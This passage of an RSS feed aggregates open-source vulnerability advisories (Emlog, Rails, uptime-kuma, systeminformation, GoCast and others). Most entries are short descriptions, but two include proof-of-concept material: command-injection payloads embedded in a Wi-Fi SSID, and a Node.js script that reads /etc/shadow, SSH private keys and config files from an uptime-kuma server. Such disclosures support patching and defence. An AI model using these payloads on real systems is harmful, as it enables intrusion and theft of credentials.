                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/emlog/emlog/issues/305'>https://github.com/emlog/emlog/issues/305</a></li><li>- <a target='_blank' href='https://vuldb.com/?ctiid.289080'>https://vuldb.com/?ctiid.289080</a></li><li>- <a target='_blank' href='https://vuldb.com/?id.289080'>https://vuldb.com/?id.289080</a></li><li>- <a target='_blank' href='https://vuldb.com/?submit.462465'>https://vuldb.com/?submit.462465</a></li></ul><br>
                            <b>Details:</b> <b></b><br>A vulnerability classified as problematic has been found in Emlog Pro up to 2.4.1. Affected is an unknown function of the file &#x2F;admin&#x2F;store.php. The manipulation of the argument tag leads to cross site scripting. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GO-2024-3101: 0 | <b>Excessive number of function parameters in compiled Wasm in github.com&#x2F;CosmWasm&#x2F;wasmvm</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GO-2024-3101</link>
                    <pubDate>2024-12-20T20:36:46Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GO-2024-3101'>https://osv.dev/vulnerability/GO-2024-3101</a><br>
                            <b>Published:</b> 2024-12-20T20:36:46Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://forum.cosmos.network/t/high-severity-security-patch-upcoming-on-wed-10th-cwa-2023-004-brought-to-you-by-certik-and-confio/12840'>https://forum.cosmos.network/t/high-severity-security-patch-upcoming-on-wed-10th-cwa-2023-004-brought-to-you-by-certik-and-confio/12840</a></li><li>- <a target='_blank' href='https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2023-004.md'>https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2023-004.md</a></li><li>- <a target='_blank' href='https://rustsec.org/advisories/RUSTSEC-2024-0366.html'>https://rustsec.org/advisories/RUSTSEC-2024-0366.html</a></li><li>- <a target='_blank' href='https://www.certik.com/resources/blog/risk-and-security-enhancement-for-app-chains-an-in-depth-writeup-of-cwa-2023'>https://www.certik.com/resources/blog/risk-and-security-enhancement-for-app-chains-an-in-depth-writeup-of-cwa-2023</a></li></ul><br>
                            <b>Details:</b> <b>Excessive number of function parameters in compiled Wasm in github.com&#x2F;CosmWasm&#x2F;wasmvm</b><br>A specifically crafted Wasm file can cause the VM to consume excessive amounts of memory when compiling a contract. This can lead to high memory usage, slowdowns, potentially a crash and can poison a lock in the VM, preventing any further interaction with contracts.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GO-2024-3343: 0 | Open Cluster Management vulnerable to Trust Boundary Violation in open-cluster-management.io&#x2F;ocm</title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GO-2024-3343</link>
                    <pubDate>2024-12-20T20:36:43Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GO-2024-3343'>https://osv.dev/vulnerability/GO-2024-3343</a><br>
                            <b>Published:</b> 2024-12-20T20:36:43Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://access.redhat.com/security/cve/CVE-2024-9779'>https://access.redhat.com/security/cve/CVE-2024-9779</a></li><li>- <a target='_blank' href='https://bugzilla.redhat.com/show_bug.cgi?id=2317916'>https://bugzilla.redhat.com/show_bug.cgi?id=2317916</a></li><li>- <a target='_blank' href='https://github.com/open-cluster-management-io/ocm/pull/325'>https://github.com/open-cluster-management-io/ocm/pull/325</a></li><li>- <a target='_blank' href='https://github.com/open-cluster-management-io/ocm/releases/tag/v0.13.0'>https://github.com/open-cluster-management-io/ocm/releases/tag/v0.13.0</a></li><li>- <a target='_blank' href='https://github.com/open-cluster-management-io/registration-operator/issues/361'>https://github.com/open-cluster-management-io/registration-operator/issues/361</a></li></ul><br>
                            <b>Details:</b> Open Cluster Management vulnerable to Trust Boundary Violation in open-cluster-management.io&#x2F;ocm
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>CVE-2024-12841: 6.1 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#CVE-2024-12841</link>
                    <pubDate>2024-12-20T19:15:06Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/CVE-2024-12841'>https://osv.dev/vulnerability/CVE-2024-12841</a><br>
                            <b>Published:</b> 2024-12-20T19:15:06Z<br>
                            <b>Severity:</b> 6.1<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/emlog/emlog/issues/305'>https://github.com/emlog/emlog/issues/305</a></li><li>- <a target='_blank' href='https://vuldb.com/?ctiid.289077'>https://vuldb.com/?ctiid.289077</a></li><li>- <a target='_blank' href='https://vuldb.com/?id.289077'>https://vuldb.com/?id.289077</a></li></ul><br>
                            <b>Details:</b> <b></b><br>A vulnerability was found in Emlog Pro up to 2.4.1. It has been classified as problematic. This affects an unknown part of the file &#x2F;admin&#x2F;tag.php. The manipulation of the argument keyword leads to cross site scripting. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-cvv5-9h9w-qp2m: 7.8 | <b>Systeminformation has command injection vulnerability in getWindowsIEEE8021x (SSID)</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-cvv5-9h9w-qp2m</link>
                    <pubDate>2024-12-20T19:13:23Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-cvv5-9h9w-qp2m'>https://osv.dev/vulnerability/GHSA-cvv5-9h9w-qp2m</a><br>
                            <b>Published:</b> 2024-12-20T19:13:23Z<br>
                            <b>Severity:</b> 7.8<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/sebhildebrandt/systeminformation/security/advisories/GHSA-cvv5-9h9w-qp2m'>https://github.com/sebhildebrandt/systeminformation/security/advisories/GHSA-cvv5-9h9w-qp2m</a></li><li>- <a target='_blank' href='https://github.com/sebhildebrandt/systeminformation/commit/f7af0a67b78e7894335a6cad510566a25e06ae41'>https://github.com/sebhildebrandt/systeminformation/commit/f7af0a67b78e7894335a6cad510566a25e06ae41</a></li><li>- <a target='_blank' href='https://github.com/sebhildebrandt/systeminformation'>https://github.com/sebhildebrandt/systeminformation</a></li></ul><br>
                            <b>Details:</b> <b>Systeminformation has command injection vulnerability in getWindowsIEEE8021x (SSID)</b><br>### Summary
The SSID is not sanitized when before it is passed as a parameter to cmd.exe in the `getWindowsIEEE8021x` function. This means that malicious content in the SSID can be executed as OS commands. 

### Details
I have exploited this vulnerability in a Windows service using version 5.22.11 of the module, to escalate privileges (in an environment where I am authorized to do so). However, as far as I can see from the code, it is still present in master branch at time of writing, on line [403&#x2F;404 of network.js](https:&#x2F;&#x2F;github.com&#x2F;sebhildebrandt&#x2F;systeminformation&#x2F;blob&#x2F;3a92931c7d46605ffddc1aacb97a9727273b2888&#x2F;lib&#x2F;network.js#L403).

The SSID is obtained from `netsh wlan show interface ...` in `getWindowsWirelessIfaceSSID`, and then passed to `cmd.exe &#x2F;d &#x2F;s &#x2F;c &quot;netsh wlan show profiles ...` in `getWindowsIEEE8021x`, without sanitization.

### PoC
First, the command injection payload should be included in the connected Wi-Fi SSID. For example create hotspot on mobile phone or other laptop, set SSID to payload, connect to it with victim Windows system. Two example SSID&#x27;s to demonstrate exploitation are below.

Demonstration to run ping command indefinitely:
```
a&quot; | ping &#x2F;t 127.0.0.1 &amp;
```

Run executable with privileges of the user in which vulnerable function is executed. Chosen executable should should be placed in (assuming system drive is C): `C:\a\a.exe`.
```
a&quot; | %SystemDrive%\a\a.exe &amp;
```

Then, the vulnerable function can be executed on the victim system, for example, using:
```
const si = require(&#x27;systeminformation&#x27;);
si.networkInterfaces((net) =&amp;gt; { console.log(net) });
```

Now the chosen command, `PING.exe` or `a.exe` will be run through the cmd.exe command line.

### Impact
This vulnerability may enable an attacker, depending on how the package is used, to perform remote code execution or local privilege escalation.


                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-hhcw-wwxv-g95c: 6.5 | <b>Oqtane Framework Insecure Direct Object Reference vulnerability</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-hhcw-wwxv-g95c</link>
                    <pubDate>2024-12-20T18:31:32Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-hhcw-wwxv-g95c'>https://osv.dev/vulnerability/GHSA-hhcw-wwxv-g95c</a><br>
                            <b>Published:</b> 2024-12-20T18:31:32Z<br>
                            <b>Severity:</b> 6.5<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/oqtane/oqtane.framework/pull/4880/files'>https://github.com/oqtane/oqtane.framework/pull/4880/files</a></li><li>- <a target='_blank' href='https://github.com/oqtane/oqtane.framework'>https://github.com/oqtane/oqtane.framework</a></li><li>- <a target='_blank' href='https://medium.com/@Rudra_2158/cve-2024-55471-breaking-down-the-idor-vulnerability-in-oqtane-framework-c0f4b02f12fc'>https://medium.com/@Rudra_2158/cve-2024-55471-breaking-down-the-idor-vulnerability-in-oqtane-framework-c0f4b02f12fc</a></li></ul><br>
                            <b>Details:</b> <b>Oqtane Framework Insecure Direct Object Reference vulnerability</b><br>Oqtane Framework is vulnerable to Insecure Direct Object Reference (IDOR) in Oqtane.Controllers.UserController. This allows unauthorized users to access sensitive information of other users by manipulating the id parameter.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-5qww-56gc-f66c: 9.8 | <b>GoCast OS Command Injection vulnerability</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-5qww-56gc-f66c</link>
                    <pubDate>2024-12-20T18:31:30Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-5qww-56gc-f66c'>https://osv.dev/vulnerability/GHSA-5qww-56gc-f66c</a><br>
                            <b>Published:</b> 2024-12-20T18:31:30Z<br>
                            <b>Severity:</b> 9.8<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/mayuresh82/gocast'>https://github.com/mayuresh82/gocast</a></li><li>- <a target='_blank' href='https://talosintelligence.com/vulnerability_reports/TALOS-2024-1960'>https://talosintelligence.com/vulnerability_reports/TALOS-2024-1960</a></li><li>- <a target='_blank' href='https://www.talosintelligence.com/vulnerability_reports/TALOS-2024-1960'>https://www.talosintelligence.com/vulnerability_reports/TALOS-2024-1960</a></li></ul><br>
                            <b>Details:</b> <b>GoCast OS Command Injection vulnerability</b><br>An OS command injection vulnerability exists in the name parameter of GoCast 1.1.3. A specially crafted HTTP request can lead to arbitrary command execution. An attacker can make an unauthenticated HTTP request to trigger this vulnerability.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-2qgm-m29m-cj2h: 6.8 | <b>uptime-kuma vulnerable to Local File Inclusion (LFI) via Improper URL Handling in `Real-Browser` monitor</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-2qgm-m29m-cj2h</link>
                    <pubDate>2024-12-20T15:10:46Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-2qgm-m29m-cj2h'>https://osv.dev/vulnerability/GHSA-2qgm-m29m-cj2h</a><br>
                            <b>Published:</b> 2024-12-20T15:10:46Z<br>
                            <b>Severity:</b> 6.8<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/louislam/uptime-kuma/security/advisories/GHSA-2qgm-m29m-cj2h'>https://github.com/louislam/uptime-kuma/security/advisories/GHSA-2qgm-m29m-cj2h</a></li><li>- <a target='_blank' href='https://github.com/louislam/uptime-kuma/commit/6cfae01a0d3727c517afe512fc8fec1d99acf875'>https://github.com/louislam/uptime-kuma/commit/6cfae01a0d3727c517afe512fc8fec1d99acf875</a></li><li>- <a target='_blank' href='https://github.com/louislam/uptime-kuma'>https://github.com/louislam/uptime-kuma</a></li><li>- <a target='_blank' href='https://github.com/louislam/uptime-kuma/releases/tag/1.23.16'>https://github.com/louislam/uptime-kuma/releases/tag/1.23.16</a></li></ul><br>
                            <b>Details:</b> <b>uptime-kuma vulnerable to Local File Inclusion (LFI) via Improper URL Handling in `Real-Browser` monitor</b><br>### Summary
An **Improper URL Handling Vulnerability** allows an attacker to access sensitive local files on the server by exploiting the `file:&#x2F;&#x2F;&#x2F;` protocol. This vulnerability is triggered via the **&quot;real-browser&quot;** request type, which takes a screenshot of the URL provided by the attacker. By supplying local file paths, such as `file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd`, an attacker can read sensitive data from the server.

### Details
The vulnerability arises because the system does not properly validate or sanitize the user input for the URL field. Specifically:

1. The URL input (`&amp;lt;input data-v-5f5c86d7=&quot;&quot; id=&quot;url&quot; type=&quot;url&quot; class=&quot;form-control&quot; pattern=&quot;https?:&#x2F;&#x2F;.+&quot; required=&quot;&quot;&amp;gt;`) allows users to input arbitrary file paths, including those using the `file:&#x2F;&#x2F;&#x2F;` protocol, without server-side validation.
   
2. The server then uses the user-provided URL to make a request, passing it to a browser instance that performs the &quot;real-browser&quot; request, which takes a screenshot of the content at the given URL. If a local file path is entered (e.g., `file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd`), the browser fetches and captures the file’s content.

```javascript
const browser = await getBrowser();
const context = await browser.newContext();
const page = await context.newPage();

const res = await page.goto(monitor.url, {
    waitUntil: &quot;networkidle&quot;,
    timeout: monitor.interval * 1000 * 0.8,
});

let filename = jwt.sign(monitor.id, server.jwtSecret) + &quot;.png&quot;;

await page.screenshot({
    path: path.join(Database.screenshotDir, filename),
});

await context.close();
```

Since the user input is not validated, an attacker can manipulate the URL to request local files (e.g., `file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd`), and the system will capture a screenshot of the file&#x27;s content, potentially exposing sensitive data.

### PoC
1. **Instructions**:
   - Enter a local file path as the URL, such as: `view-source:file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd`.
   - The server will process the URL and, in &quot;real-browser&quot; mode, capture a screenshot of the file content.

Example PoC:

1. Log in to the application with valid credentials:

```javascript
const { io } = require(&quot;socket.io-client&quot;);

&#x2F;&#x2F; Server configuration and credentials
const CONFIG = {
  serverUrl: &quot;ws:&#x2F;&#x2F;localhost:3001&quot;,
  credentials: {
    username: &quot;admin&quot;,
    password: &quot;password1&quot;
  },
  requestType: {
    REAL_BROWSER: &quot;real-browser&quot;,
    HTTP: &quot;http&quot;
  },
  urlHeader: {
    VIEW_SOURCE: &quot;view-source:file:&#x2F;&#x2F;&#x2F;&quot;,
    FILE: &quot;file:&#x2F;&#x2F;&#x2F;&quot;
  }
};

&#x2F;&#x2F; List of sensitive files on a Linux system
const SENSITIVE_FILES = [
  &quot;&#x2F;etc&#x2F;passwd&quot;,
  &quot;&#x2F;etc&#x2F;shadow&quot;,
  &quot;&#x2F;etc&#x2F;hosts&quot;,
  &quot;&#x2F;etc&#x2F;hostname&quot;,
  &quot;&#x2F;etc&#x2F;network&#x2F;interfaces&quot;, &#x2F;&#x2F; May vary depending on the distribution
  &quot;&#x2F;etc&#x2F;ssh&#x2F;ssh_config&quot;,
  &quot;&#x2F;etc&#x2F;ssh&#x2F;sshd_config&quot;,
  &quot;~&#x2F;.ssh&#x2F;authorized_keys&quot;,
  &quot;~&#x2F;.ssh&#x2F;id_rsa&quot;,
  &quot;&#x2F;etc&#x2F;ssl&#x2F;private&#x2F;*.key&quot;,
  &quot;&#x2F;etc&#x2F;ssl&#x2F;certs&#x2F;*.crt&quot;,
  &quot;&#x2F;app&#x2F;data&#x2F;kuma.db&quot;, &#x2F;&#x2F; Uptime Kuma database file
  &quot;&#x2F;app&#x2F;data&#x2F;config.json&quot; &#x2F;&#x2F; Uptime Kuma configuration file
];

&#x2F;&#x2F; Function to send a request and wait for the response
function sendRequest(socket, filePath, type) {
  return new Promise((resolve, reject) =&amp;gt; {
    fileUrl = CONFIG.urlHeader.VIEW_SOURCE + filePath;
    if (type == CONFIG.requestType.HTTP) {
      fileUrl = CONFIG.urlHeader.FILE + filePath;
    }
    socket.emit(&quot;add&quot;, {
      type: type,
      name: type + &quot; &quot; + filePath,
      url: fileUrl,
      method: &quot;GET&quot;,
      maxretries: 0,
      timeout: 500,
      notificationIDList: {},
      ignoreTls: true,
      upsideDown: false,
      accepted_statuscodes: [&quot;200-299&quot;]
    }, (res) =&amp;gt; {
      console.log(`Response for file ${filePath}:`, res);
      resolve();
    });
  });
}

&#x2F;&#x2F; Main function for connecting and sending the &#x27;add&#x27; request
(async () =&amp;gt; {
  const socket = io(CONFIG.serverUrl);

  &#x2F;&#x2F; Handle connection errors
  socket.on(&quot;connect_error&quot;, (err) =&amp;gt; {
    console.error(&quot;Connection failed:&quot;, err.message);
  });

  try {
    &#x2F;&#x2F; Connecting with credentials
    await new Promise((resolve, reject) =&amp;gt; {
      socket.emit(&quot;login&quot;, {
        username: CONFIG.credentials.username,
        password: CONFIG.credentials.password,
        token: &quot;&quot;
      }, (res) =&amp;gt; {
        if (res.ok) {
          console.log(&quot;Connection successful&quot;);
          resolve();
        } else {
          console.log(res);
          reject(new Error(&quot;Connection failed&quot;));
        }
      });
    });

    &#x2F;&#x2F; Sending requests for each file using Promise.all to ensure synchronization
    const realBrowserRequests = SENSITIVE_FILES.map(filePath =&amp;gt; sendRequest(socket, filePath, CONFIG.requestType.REAL_BROWSER));

    &#x2F;&#x2F; Wait for all requests to be sent
    await Promise.all([...realBrowserRequests]);

    &#x2F;&#x2F; Close the socket after all requests have been sent
    socket.close();
    console.log(&quot;Connection closed after all requests.&quot;);

  } catch (error) {
    console.error(&quot;Error:&quot;, error.message);
    socket.close();
  }
})();
```

### Impact
This vulnerability is a **Local File Inclusion (LFI)** issue, which allows an attacker to access and potentially exfiltrate sensitive files from the server. The impact is significant, as attackers can access critical system files or application configuration files, such as:
- `&#x2F;etc&#x2F;passwd`: Contains user account information.
- `&#x2F;etc&#x2F;shadow`: Contains password hashes.
- `&#x2F;app&#x2F;data&#x2F;kuma.db`: Contains the database for the Uptime Kuma monitoring tool.
- `&#x2F;app&#x2F;data&#x2F;config.json`: Contains the database credentials for Uptime Kuma.

Any **authenticated user** who can submit a URL in &quot;real-browser&quot; mode is at risk of exposing sensitive data through screenshots of these files.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-3q97-vjpp-c8rp: 8.9 | <b>Socialstream has a Potential Account Takeover Vulnerability in Social Account Linking Due to Missing User Consent After OAuth Callback</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-3q97-vjpp-c8rp</link>
                    <pubDate>2024-12-20T15:01:20Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-3q97-vjpp-c8rp'>https://osv.dev/vulnerability/GHSA-3q97-vjpp-c8rp</a><br>
                            <b>Published:</b> 2024-12-20T15:01:20Z<br>
                            <b>Severity:</b> 8.9<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/joelbutcher/socialstream/security/advisories/GHSA-3q97-vjpp-c8rp'>https://github.com/joelbutcher/socialstream/security/advisories/GHSA-3q97-vjpp-c8rp</a></li><li>- <a target='_blank' href='https://github.com/joelbutcher/socialstream/commit/ae4dc3906f54fa792b296036d7b3dcea9a4d259b'>https://github.com/joelbutcher/socialstream/commit/ae4dc3906f54fa792b296036d7b3dcea9a4d259b</a></li><li>- <a target='_blank' href='https://github.com/joelbutcher/socialstream'>https://github.com/joelbutcher/socialstream</a></li></ul><br>
                            <b>Details:</b> <b>Socialstream has a Potential Account Takeover Vulnerability in Social Account Linking Due to Missing User Consent After OAuth Callback</b><br>## Description

When linking a social account to an already authenticated user, the lack of a confirmation step introduces a security risk. This is exacerbated if -&amp;gt;stateless() is used in the Socialite configuration, bypassing state verification and making the exploit easier. Developers should ensure that users explicitly confirm account linking and avoid configurations that skip critical security checks.

## Resolution
Socialstream v6.2 introduces a new custom route that requires a user to &quot;Confirm&quot; or &quot;Deny&quot; a request to link a social account.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-rails-2024-26142: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-rails-2024-26142</link>
                    <pubDate>2024-12-20T09:50:24.319Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-rails-2024-26142'>https://osv.dev/vulnerability/BIT-rails-2024-26142</a><br>
                            <b>Published:</b> 2024-12-20T09:50:24.319Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://discuss.rubyonrails.org/t/possible-redos-vulnerability-in-accept-header-parsing-in-action-dispatch/84946'>https://discuss.rubyonrails.org/t/possible-redos-vulnerability-in-accept-header-parsing-in-action-dispatch/84946</a></li><li>- <a target='_blank' href='https://github.com/rails/rails/commit/b4d3bfb5ed8a5b5a90aad3a3b28860c7a931e272'>https://github.com/rails/rails/commit/b4d3bfb5ed8a5b5a90aad3a3b28860c7a931e272</a></li><li>- <a target='_blank' href='https://github.com/rails/rails/security/advisories/GHSA-jjhx-jhvp-74wq'>https://github.com/rails/rails/security/advisories/GHSA-jjhx-jhvp-74wq</a></li><li>- <a target='_blank' href='https://github.com/rubysec/ruby-advisory-db/blob/master/gems/actionpack/CVE-2024-26142.yml'>https://github.com/rubysec/ruby-advisory-db/blob/master/gems/actionpack/CVE-2024-26142.yml</a></li><li>- <a target='_blank' href='https://security.netapp.com/advisory/ntap-20240503-0003/'>https://security.netapp.com/advisory/ntap-20240503-0003/</a></li></ul><br>
                            <b>Details:</b> <b></b><br>Rails is a web-application framework. Starting in version 7.1.0, there is a possible ReDoS vulnerability in the Accept header parsing routines of Action Dispatch. This vulnerability is patched in 7.1.3.1. Ruby 3.2 has mitigations for this problem, so Rails applications using Ruby 3.2 or newer are unaffected.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-rails-2024-26143: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-rails-2024-26143</link>
                    <pubDate>2024-12-20T09:50:15.432Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-rails-2024-26143'>https://osv.dev/vulnerability/BIT-rails-2024-26143</a><br>
                            <b>Published:</b> 2024-12-20T09:50:15.432Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://discuss.rubyonrails.org/t/possible-xss-vulnerability-in-action-controller/84947'>https://discuss.rubyonrails.org/t/possible-xss-vulnerability-in-action-controller/84947</a></li><li>- <a target='_blank' href='https://github.com/rails/rails/commit/4c83b331092a79d58e4adffe4be5f250fa5782cc'>https://github.com/rails/rails/commit/4c83b331092a79d58e4adffe4be5f250fa5782cc</a></li><li>- <a target='_blank' href='https://github.com/rails/rails/commit/5187a9ef51980ad1b8e81945ebe0462d28f84f9e'>https://github.com/rails/rails/commit/5187a9ef51980ad1b8e81945ebe0462d28f84f9e</a></li><li>- <a target='_blank' href='https://github.com/rails/rails/security/advisories/GHSA-9822-6m93-xqf4'>https://github.com/rails/rails/security/advisories/GHSA-9822-6m93-xqf4</a></li><li>- <a target='_blank' href='https://github.com/rubysec/ruby-advisory-db/blob/master/gems/actionpack/CVE-2024-26143.yml'>https://github.com/rubysec/ruby-advisory-db/blob/master/gems/actionpack/CVE-2024-26143.yml</a></li><li>- <a target='_blank' href='https://security.netapp.com/advisory/ntap-20240510-0004/'>https://security.netapp.com/advisory/ntap-20240510-0004/</a></li></ul><br>
                            <b>Details:</b> <b></b><br>Rails is a web-application framework. There is a possible XSS vulnerability when using the translation helpers in Action Controller. Applications using translation methods like translate, or t on a controller, with a key ending in &quot;_html&quot;, a :default key which contains untrusted user input, and the resulting string is used in a view, may be susceptible to an XSS vulnerability. The vulnerability is fixed in 7.1.3.1 and 7.0.8.1.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-rails-2024-26144: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-rails-2024-26144</link>
                    <pubDate>2024-12-20T09:50:06.835Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-rails-2024-26144'>https://osv.dev/vulnerability/BIT-rails-2024-26144</a><br>
                            <b>Published:</b> 2024-12-20T09:50:06.835Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://discuss.rubyonrails.org/t/possible-sensitive-session-information-leak-in-active-storage/84945'>https://discuss.rubyonrails.org/t/possible-sensitive-session-information-leak-in-active-storage/84945</a></li><li>- <a target='_blank' href='https://github.com/rails/rails/commit/723f54566023e91060a67b03353e7c03e7436433'>https://github.com/rails/rails/commit/723f54566023e91060a67b03353e7c03e7436433</a></li><li>- <a target='_blank' href='https://github.com/rails/rails/commit/78fe149509fac5b05e54187aaaef216fbb5fd0d3'>https://github.com/rails/rails/commit/78fe149509fac5b05e54187aaaef216fbb5fd0d3</a></li><li>- <a target='_blank' href='https://github.com/rails/rails/security/advisories/GHSA-8h22-8cf7-hq6g'>https://github.com/rails/rails/security/advisories/GHSA-8h22-8cf7-hq6g</a></li><li>- <a target='_blank' href='https://github.com/rubysec/ruby-advisory-db/blob/master/gems/activestorage/CVE-2024-26144.yml'>https://github.com/rubysec/ruby-advisory-db/blob/master/gems/activestorage/CVE-2024-26144.yml</a></li><li>- <a target='_blank' href='https://security.netapp.com/advisory/ntap-20240510-0013/'>https://security.netapp.com/advisory/ntap-20240510-0013/</a></li></ul><br>
                            <b>Details:</b> <b></b><br>Rails is a web-application framework. Starting with version 5.2.0, there is a possible sensitive session information leak in Active Storage. By default, Active Storage sends a Set-Cookie header along with the user&#x27;s session cookie when serving blobs. It also sets Cache-Control to public. Certain proxies may cache the Set-Cookie, leading to an information leak. The vulnerability is fixed in 7.0.8.1 and 6.1.7.7.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-rails-2024-32464: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-rails-2024-32464</link>
                    <pubDate>2024-12-20T09:49:50.531Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-rails-2024-32464'>https://osv.dev/vulnerability/BIT-rails-2024-32464</a><br>
                            <b>Published:</b> 2024-12-20T09:49:50.531Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/rails/rails/commit/e215bf3360e6dfe1497c1503a495e384ed6b0995'>https://github.com/rails/rails/commit/e215bf3360e6dfe1497c1503a495e384ed6b0995</a></li><li>- <a target='_blank' href='https://github.com/rails/rails/security/advisories/GHSA-prjp-h48f-jgf6'>https://github.com/rails/rails/security/advisories/GHSA-prjp-h48f-jgf6</a></li></ul><br>
                            <b>Details:</b> <b></b><br>Action Text brings rich text content and editing to Rails. Instances of ActionText::Attachable::ContentAttachment included within a rich_text_area tag could potentially contain unsanitized HTML. This vulnerability is fixed in 7.1.3.4.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-rails-2024-54133: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-rails-2024-54133</link>
                    <pubDate>2024-12-20T09:49:12.115Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-rails-2024-54133'>https://osv.dev/vulnerability/BIT-rails-2024-54133</a><br>
                            <b>Published:</b> 2024-12-20T09:49:12.115Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/rails/rails/commit/2e3f41e4538b9ca1044357f6644f037bbb7c6c49'>https://github.com/rails/rails/commit/2e3f41e4538b9ca1044357f6644f037bbb7c6c49</a></li><li>- <a target='_blank' href='https://github.com/rails/rails/commit/3da2479cfe1e00177114b17e496213c40d286b3a'>https://github.com/rails/rails/commit/3da2479cfe1e00177114b17e496213c40d286b3a</a></li><li>- <a target='_blank' href='https://github.com/rails/rails/commit/5558e72f22fc69c1c407b31ac5fb3b4ce087b542'>https://github.com/rails/rails/commit/5558e72f22fc69c1c407b31ac5fb3b4ce087b542</a></li><li>- <a target='_blank' href='https://github.com/rails/rails/commit/cb16a3bb515b5d769f73926d9757270ace691f1d'>https://github.com/rails/rails/commit/cb16a3bb515b5d769f73926d9757270ace691f1d</a></li><li>- <a target='_blank' href='https://github.com/rails/rails/security/advisories/GHSA-vfm5-rmrh-j26v'>https://github.com/rails/rails/security/advisories/GHSA-vfm5-rmrh-j26v</a></li></ul><br>
                            <b>Details:</b> <b></b><br>Action Pack is a framework for handling and responding to web requests. There is a possible Cross Site Scripting (XSS) vulnerability  in the `content_security_policy` helper starting in version 5.2.0 of Action Pack and prior to versions 7.0.8.7, 7.1.5.1, 7.2.2.1, and 8.0.0.1. Applications which set Content-Security-Policy (CSP) headers dynamically from untrusted user input may be vulnerable to carefully crafted inputs being able to inject new directives into the CSP. This could lead to a bypass of the CSP and its protection against XSS and other attacks. Versions 7.0.8.7, 7.1.5.1, 7.2.2.1, and 8.0.0.1 contain a fix. As a workaround, applications can avoid setting CSP headers dynamically from untrusted input, or can validate&#x2F;sanitize that input.
                        ]]>
                    </description>
                </item>
            
